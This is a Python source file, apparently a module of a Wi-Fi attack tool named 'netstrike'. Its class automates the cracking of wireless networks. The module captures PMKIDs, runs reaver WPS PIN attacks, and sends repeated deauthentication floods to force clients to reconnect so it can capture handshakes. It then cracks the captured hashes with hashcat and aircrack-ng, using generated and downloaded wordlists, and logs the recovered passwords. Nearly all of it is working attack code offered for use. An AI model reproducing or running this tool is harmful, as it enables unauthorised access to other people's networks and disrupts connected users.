#!/usr/bin/env python3

import os
import time
import subprocess
import threading
import csv

class PasswordCracker:
    def __init__(self, core, scanner):
        self.core = core
        self.scanner = scanner
        self.cracking_active = False

    def auto_crack_attack(self):
        """Professional Auto Cracking - Multiple Methods"""
        print("\033[1;36m[→] Starting professional cracking protocol...\033[0m")
        
        # Always fresh scan
        if self.scanner.wifi_scan():
            self.scanner.display_scan_results()
            target = self.scanner.select_target()
            
            if target:
                print(f"\033[1;33m[🎯] Target: {target['essid']}\033[0m")
                print("\033[1;36m[⚡] Professional cracking sequence initiated...\033[0m")
                
                # Professional method sequence
                if self.professional_cracking_sequence(target):
                    return
                
                print("\033[1;31m[✘] All professional methods exhausted\033[0m")

    def professional_cracking_sequence(self, target):
        """Professional cracking method sequence"""
        methods = [
            ("PMKID Capture", self.professional_pmkid_attack),
            ("WPS Assessment", self.professional_wps_assessment),
            ("Handshake Capture", self.professional_handshake_capture),
            ("Advanced Dictionary", self.professional_dictionary_attack)
        ]
        
        for method_name, method_func in methods:
            print(f"\033[1;36m[→] Professional method: {method_name}\033[0m")
            
            result = method_func(target)
            
            if result:
                print(f"\033[1;32m[🎉] Success with {method_name}!\033[0m")
                return True
            else:
                print(f"\033[1;33m[⚠️] {method_name} incomplete\033[0m")
                time.sleep(2)
        
        return False

    def professional_pmkid_attack(self, target):
        """Professional PMKID attack"""
        print("\033[1;33m[!] Attempting professional PMKID capture...\033[0m")
        
        pmkid_file = f"/tmp/netstrike_pmkid_{target['bssid'].replace(':', '')}"
        
        # Professional PMKID capture
        capture_cmd = f"timeout 30 hcxdumptool -i {self.core.mon_interface} -o {pmkid_file}.pcapng --filterlist={target['bssid']} --filtermode=2 --enable_status=1"
        result = self.core.run_command(capture_cmd)
        
        if os.path.exists(f"{pmkid_file}.pcapng") and os.path.getsize(f"{pmkid_file}.pcapng") > 100:
            print("\033[1;32m[✓] PMKID captured professionally\033[0m")
            
            # Convert to hash format
            convert_cmd = f"hcxpcaptool -z {pmkid_file}.hash {pmkid_file}.pcapng"
            self.core.run_command(convert_cmd)
            
            if os.path.exists(f"{pmkid_file}.hash"):
                return self.professional_crack_pmkid(f"{pmkid_file}.hash", target)
        
        print("\033[1;31m[✘] PMKID capture failed\033[0m")
        return False

    def professional_crack_pmkid(self, hash_file, target):
        """Professional PMKID cracking"""
        wordlist = self.get_professional_wordlist()
        
        if wordlist:
            print("\033[1;36m[→] Professional PMKID cracking...\033[0m")
            
            crack_cmd = f"hashcat -m 16800 {hash_file} {wordlist} -O --force -w 3"
            result = self.core.run_command(crack_cmd, timeout=300)
            
            if result and "Cracked" in result.stdout:
                print("\033[1;32m[🎉] PMKID cracked successfully!\033[0m")
                lines = result.stdout.split('\n')
                for line in lines:
                    if "Cracked" in line and ":" in line:
                        password = line.split(':')[-1].strip()
                        print(f"\033[1;32m[🔓] PASSWORD: {password}\033[0m")
                        self.save_cracked_password(target, password)
                        return True
        
        return False

    def professional_wps_assessment(self, target):
        """Professional WPS assessment"""
        print("\033[1;33m[!] Professional WPS vulnerability assessment...\033[0m")
        
        wash_cmd = f"timeout 20 wash -i {self.core.mon_interface} -s -C"
        result = self.core.run_command(wash_cmd)
        
        if result and target['bssid'] in result.stdout:
            print("\033[1;32m[✓] WPS vulnerability detected\033[0m")
            print("\033[1;31m[💣] Launching professional WPS attack...\033[0m")
            
            # Professional WPS attack
            reaver_proc = self.core.run_command(
                f"reaver -i {self.core.mon_interface} -b {target['bssid']} -c {target['channel']} -vv -K 1 -N -A -d 2",
                background=True
            )
            
            if reaver_proc:
                print("\033[1;32m[⚡] Professional WPS attack running\033[0m")
                return True
        else:
            print("\033[1;31m[✘] WPS not available\033[0m")
        
        return False

    def professional_handshake_capture(self, target):
        """Professional handshake capture with targeted deauth"""
        print("\033[1;33m[!] Professional handshake capture...\033[0m")
        
        cap_file = f"/tmp/netstrike_handshake_{target['bssid'].replace(':', '_')}"
        
        # Set channel
        self.core.run_command(f"iwconfig {self.core.mon_interface} channel {target['channel']}")
        
        # Start professional capture
        print("\033[1;36m[→] Professional capture for 60 seconds...\033[0m")
        capture_proc = self.core.run_command(
            f"airodump-ng -c {target['channel']} --bssid {target['bssid']} -w {cap_file} {self.core.mon_interface}",
            background=True
        )
        
        # Professional targeted deauth
        print("\033[1;31m[💣] Professional targeted deauth...\033[0m")
        deauth_thread = threading.Thread(target=self.professional_targeted_deauth, args=(target,))
        deauth_thread.daemon = True
        deauth_thread.start()
        
        # Monitor for handshake
        handshake_captured = False
        start_time = time.time()
        while time.time() - start_time < 60 and not handshake_captured:
            if self.check_professional_handshake(f"{cap_file}-01.cap"):
                handshake_captured = True
                break
            time.sleep(5)
        
        if capture_proc:
            capture_proc.terminate()
        
        if handshake_captured:
            print("\033[1;32m[✓] Professional handshake captured!\033[0m")
            return self.professional_crack_handshake(f"{cap_file}-01.cap", target['bssid'], target['essid'])
        else:
            print("\033[1;31m[✘] Handshake capture failed\033[0m")
            return False

    def professional_targeted_deauth(self, target):
        """Professional targeted deauth attack"""
        # Get specific clients for targeted deauth
        target_clients = [c for c, info in self.scanner.clients.items() if info.get('bssid') == target['bssid']]
        
        if target_clients:
            print(f"\033[1;31m[⚡] Targeting {len(target_clients)} specific clients\033[0m")
            for i in range(15):
                for client_mac in target_clients:
                    if self.cracking_active:
                        break
                    self.core.run_command(f"aireplay-ng --deauth 5 -a {target['bssid']} -c {client_mac} {self.core.mon_interface} >/dev/null 2>&1")
                    time.sleep(1)
        else:
            # Fallback to broadcast
            print("\033[1;33m[!] No clients found, using broadcast deauth\033[0m")
            for i in range(15):
                self.core.run_command(f"aireplay-ng --deauth 10 -a {target['bssid']} {self.core.mon_interface} >/dev/null 2>&1")
                time.sleep(2)

    def professional_dictionary_attack(self, target):
        """Professional dictionary attack"""
        print("\033[1;33m[!] Professional dictionary attack...\033[0m")
        
        wordlists = self.get_professional_wordlists()
        
        # Check for existing handshake
        cap_file = f"/tmp/netstrike_handshake_{target['bssid'].replace(':', '_')}-01.cap"
        if not os.path.exists(cap_file):
            print("\033[1;31m[✘] No handshake file found\033[0m")
            return False
        
        for wordlist_name, wordlist_path in wordlists.items():
            if wordlist_path and os.path.exists(wordlist_path):
                print(f"\033[1;36m[→] Professional wordlist: {wordlist_name}\033[0m")
                
                result = self.core.run_command(
                    f"aircrack-ng -w {wordlist_path} -b {target['bssid']} {cap_file} -l /tmp/cracked.txt -q",
                    timeout=300
                )
                
                if os.path.exists("/tmp/cracked.txt"):
                    with open("/tmp/cracked.txt", 'r') as f:
                        password = f.read().strip()
                    print(f"\033[1;32m[🎉] PASSWORD CRACKED: {password}\033[0m")
                    self.save_cracked_password(target, password)
                    return True
        
        return False

    def check_professional_handshake(self, cap_file):
        """Professional handshake verification"""
        if not os.path.exists(cap_file):
            return False
        
        result = self.core.run_command(f"aircrack-ng {cap_file} 2>/dev/null | grep '1 handshake'")
        return result and "1 handshake" in result.stdout

    def professional_crack_handshake(self, cap_file, bssid, essid):
        """Professional handshake cracking"""
        print("\033[1;33m[!] Professional handshake cracking...\033[0m")
        
        # Create intelligent wordlist first
        smart_wordlist = self.create_professional_wordlist(essid)
        
        wordlist_priority = [
            ("Intelligent Wordlist", smart_wordlist),
            ("Professional Wordlist", self.get_professional_wordlist()),
            ("RockYou", self.get_rockyou_wordlist()),
            ("Common Passwords", self.get_common_wordlist())
        ]
        
        for wl_name, wl_path in wordlist_priority:
            if wl_path and os.path.exists(wl_path):
                print(f"\033[1;36m[→] Professional attempt: {wl_name}\033[0m")
                
                result = self.core.run_command(
                    f"aircrack-ng -w {wl_path} -b {bssid} {cap_file} -l /tmp/cracked.txt -q",
                    timeout=600
                )
                
                if os.path.exists("/tmp/cracked.txt"):
                    with open("/tmp/cracked.txt", 'r') as f:
                        password = f.read().strip()
                    print(f"\033[1;32m[🎉] PASSWORD: {password}\033[0m")
                    self.save_cracked_password({'essid': essid, 'bssid': bssid}, password)
                    return True
        
        return False

    def create_professional_wordlist(self, essid):
        """Create professional targeted wordlist"""
        wordlist_path = "/tmp/netstrike_pro_wordlist.txt"
        
        common_passwords = [
            "12345678", "password", "admin123", "welcome", "qwerty", "letmein",
            "123456789", "password123", "admin", "welcome123", "1234567890",
            "1234", "12345", "123456", "1234567", "internet", "wireless",
            "default", "guest", "linksys", "dlink", "netgear", "cisco", "root"
        ]
        
        # Professional ESSID-based variations
        if essid and essid != "HIDDEN_SSID" and "HIDDEN" not in essid:
            clean_essid = essid.replace('_', '').replace('-', '').replace(' ', '')
            
            variations = [
                essid, essid + "123", essid + "1234", essid + "12345", essid + "2024",
                essid.lower(), essid.upper(), clean_essid, clean_essid + "123",
                essid.replace(' ', ''), essid.replace(' ', '_'), essid.replace(' ', '-')
            ]
            
            common_passwords.extend(variations)
        
        # Remove duplicates
        common_passwords = list(set(common_passwords))
        
        try:
            with open(wordlist_path, 'w') as f:
                for pwd in common_passwords:
                    f.write(pwd + '\n')
            
            return wordlist_path
        except:
            return None

    def get_professional_wordlists(self):
        """Get professional wordlists"""
        return {
            "Professional": self.get_professional_wordlist(),
            "RockYou": self.get_rockyou_wordlist(),
            "Common": self.get_common_wordlist()
        }

    def get_professional_wordlist(self):
        """Get professional wordlist"""
        pro_path = "/tmp/professional_wordlist.txt"
        
        if not os.path.exists(pro_path):
            # Create professional wordlist
            pro_passwords = [
                "123456", "password", "12345678", "qwerty", "123456789",
                "12345", "1234", "111111", "1234567", "dragon",
                "123123", "baseball", "abc123", "football", "monkey",
                "letmein", "696969", "shadow", "master", "666666"
            ]
            
            try:
                with open(pro_path, 'w') as f:
                    for pwd in pro_passwords:
                        f.write(pwd + '\n')
            except:
                pass
        
        return pro_path

    def get_rockyou_wordlist(self):
        """Get rockyou wordlist"""
        rockyou_path = "/usr/share/wordlists/rockyou.txt"
        
        if os.path.exists(rockyou_path):
            return rockyou_path
        
        # Try to download
        self.core.run_command("wget -q https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -O /tmp/rockyou.txt 2>/dev/null")
        
        if os.path.exists("/tmp/rockyou.txt"):
            return "/tmp/rockyou.txt"
        
        return None

    def get_common_wordlist(self):
        """Get common password wordlist"""
        common_path = "/tmp/common_passwords.txt"
        
        if not os.path.exists(common_path):
            common_passwords = [
                "123456", "password", "12345678", "qwerty", "123456789",
                "12345", "1234", "111111", "1234567", "dragon"
            ]
            
            try:
                with open(common_path, 'w') as f:
                    for pwd in common_passwords:
                        f.write(pwd + '\n')
            except:
                pass
        
        return common_path

    def save_cracked_password(self, target, password):
        """Save cracked password professionally"""
        try:
            with open("/tmp/netstrike_cracked.txt", "a") as f:
                f.write(f"Network: {target['essid']} | Password: {password}\n")
            print(f"\033[1;32m[💾] Password saved to: /tmp/netstrike_cracked.txt\033[0m")
        except:
            pass

    def wps_pin_attack(self):
        """Professional WPS PIN attack"""
        print("\033[1;33m[!] Professional WPS network scan...\033[0m")
        
        wash_proc = self.core.run_command(
            f"timeout 30 wash -i {self.core.mon_interface} -C",
            background=True
        )
        
        time.sleep(30)
        
        target_bssid = input("\033[1;33m[?] Enter target BSSID: \033[0m").strip()
        target_channel = input("\033[1;33m[?] Enter target channel: \033[0m").strip()
        
        if target_bssid and target_channel:
            print("\033[1;31m[💣] Professional WPS attack...\033[0m")
            
            self.core.run_command(
                f"reaver -i {self.core.mon_interface} -b {target_bssid} -c {target_channel} -vv -K 1 -N -A",
                background=True
            )
            
            print("\033[1;32m[✅] Professional WPS attack deployed\033[0m")
        else:
            print("\033[1;31m[✘] Invalid target data\033[0m")
